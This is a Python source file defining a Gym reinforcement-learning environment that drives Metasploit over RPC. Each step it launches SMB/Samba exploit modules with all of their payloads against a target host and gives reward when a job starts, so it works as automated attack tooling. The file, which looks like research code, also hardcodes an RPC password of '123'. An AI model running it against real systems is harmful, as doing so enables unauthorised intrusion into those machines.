from pymetasploit3.msfrpc import MsfRpcClient
import nmap3
from gym import Env
from gym.spaces import Box, Discrete
import random
import numpy as np

def WriteFile(text):
    f = open("list_module.txt", "a")
    f.write(text+'\n')
    f.close()


def prepareListAction(host):
    client = MsfRpcClient('123', port=55552)
    # nmap = nmap3.NmapScanTechniques()
    # res = nmap.nmap_tcp_scan(host)
    # list_service = res[host]['ports']

    list_exploit = client.modules.exploits
    list_action = []

    # for i in list_exploit:
    #     for j in list_service:
    #         if j['service']['name'] in i:
    #             list_action.append(i)
    #             WriteFile(i)

    for i in list_exploit:
        if ("smb" in i or "samba" in i) and "windows" not in i and "osx" not in i:
            list_action.append(i)
            WriteFile(i)

    return list_action, client

def getActionList(host):
    client = MsfRpcClient('123', port=55552)
    f = open("list_module.txt", "r")
    string_read = f.read()
    list_action = string_read.split('\n')
    del list_action[-1]
    return list_action, client


class ExpEnv(Env):
    def __init__(self,host):
        self.action_list, self.client = getActionList(host)
        self.action_space = Discrete(len(self.action_list))
        self.state = [0]
        self.observation_space = [[0,1],[1,0]]
        self.host = host
        self.shower_length = 5

    def step(self,action):
        self.shower_length -= 1
        reward = 0
        try:
            exploit = self.client.modules.use('exploit',self.action_list[action])
            array_payload = exploit.targetpayloads()
            exploit['RHOSTS'] = self.host
            print(self.action_list[action])
            for payload in array_payload:
                    res = exploit.execute(payload=payload)
                    if res['job_id'] != None and res['job_id']>0:
                        reward += 2
                        self.state = [1,0]
                    else:
                        reward -= 1
        except:
            reward -=2
            self.state = [0,1]
        
        if self.shower_length <= 0: 
            done = True
        else:
            done = False

        info ={}
        return self.state, reward, done, info
    
    def reset(self):
        self.state = [0,1]
        self.shower_length = 5
        return self.state
        



        